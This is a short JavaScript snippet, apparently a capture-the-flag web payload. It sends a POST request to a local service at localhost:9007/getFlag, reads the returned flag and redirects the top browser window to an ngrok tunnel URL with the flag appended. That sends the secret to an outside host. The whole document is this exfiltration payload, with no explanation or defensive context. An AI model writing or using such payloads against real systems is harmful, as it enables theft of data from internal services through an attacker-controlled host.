fetch("http://localhost:9007/getFlag", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    giveMe: "theFlag"
  })
})
.then(res => res.text())
.then(flag => window.top.location.href = "https://17b9-161-115-51-75.ngrok-free.app/" + flag);
